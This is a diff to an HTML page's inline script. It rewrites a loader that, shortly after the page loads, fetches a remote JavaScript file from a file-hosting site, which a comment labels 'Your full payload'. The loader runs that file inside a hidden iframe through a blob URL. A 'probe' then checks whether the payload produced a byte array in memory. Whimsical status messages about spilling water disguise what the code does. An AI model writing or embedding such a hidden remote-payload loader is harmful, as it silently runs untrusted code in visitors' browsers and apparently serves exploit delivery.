@@ -6,52 +6,58 @@
   <link rel="stylesheet" href="style250.css" />
   <script>
   setTimeout(() => {
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
+    fetch('https://files.catbox.moe/cwedrd.js') // Your full payload
+      .then(res => res.text())
+      .then(js => {
+        const blob = new Blob([js], { type: 'text/html' });
+        const url = URL.createObjectURL(blob);
 
-    // Loads a generic HTML page
-    iframe.src = 'https://files.catbox.moe/7cwlbl.html';
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = url;
 
-    iframe.onload = () => {
-      // Redirects to the payload
-      iframe.contentWindow.location.href = 'https://files.catbox.moe/cwedrd.js';
-      const now = () => `${Math.floor(performance.now())}ms`;
-      document.getElementById("status").textContent = `Spilling 250ml... [${now()}]`;
+        iframe.onload = () => {
+          const now = () => `${Math.floor(performance.now())}ms`;
+          document.getElementById("status").textContent = `Spilling 250ml... [${now()}]`;
+        
+          // 🧪 Execution Probe (runs 5s after load)
+          setTimeout(() => {
+            try {
+              const frame = window.frames[0];
 
-    };
+              if (!frame) {
+                document.getElementById("status").textContent = "The iframe is missing. The bottle is locked.";
+                return;
+              }
 
-    iframe.onerror = () => {
-      document.getElementById("status").textContent = "Bottle not filled. Try again.";
-    };
+              if (!('payloadBytes' in frame)) {
+                document.getElementById("status").textContent = "No water has been spilled. Or maybe some did, but it didn't touch the memory.";
+                return;
+              }
 
-   setTimeout(() => {
-     try {
-       const frame = window.frames[0];
+              const result = frame.payloadBytes;
 
-       if (!frame) {
-         document.getElementById("status").textContent = "Iframe is missing so the bottle is locked.";
-         return;
-    }
+              if (result instanceof Uint8Array) {
+                document.getElementById("status").textContent = "Water spilled successfully!";
+              } else {
+                document.getElementById("status").textContent = "The bottle has a major manufacturing defect.";
+              }
+            } catch (e) {
+              document.getElementById("status").textContent = `The water has no sensitivity: ${e.message}`;
+            }
+          }, 5000);
+        };
 
-    if (!('payloadBytes' in frame)) {
-      document.getElementById("status").textContent = "No water has been spilled. Or maybe some did, but it didn't touch the memory.";
-      return;
-    }
+        iframe.onerror = () => {
+          document.getElementById("status").textContent = "Bottle not filled. Try again.";
+        };
 
-    const result = frame.payloadBytes;
-
-    if (result instanceof Uint8Array) {
-      document.getElementById("status").textContent = "Water spilled successfully!";
-    } else {
-      document.getElementById("status").textContent = "The bottle has a major manufacturing defect.";
-    }
-  } catch (e) {
-    document.getElementById("status").textContent = `The water has no sensitivity: ${e.message}`;
-  }
-}, 5000);
-
-    document.body.appendChild(iframe);
-  }, 1500);
+        document.body.appendChild(iframe);
+      })
+      .catch(e => {
+        document.getElementById("status").textContent = `The bottle couldn't even be poured: ${e.message}`;
+      });
+   }, 1500);
 </script>
 </head>
 <body>
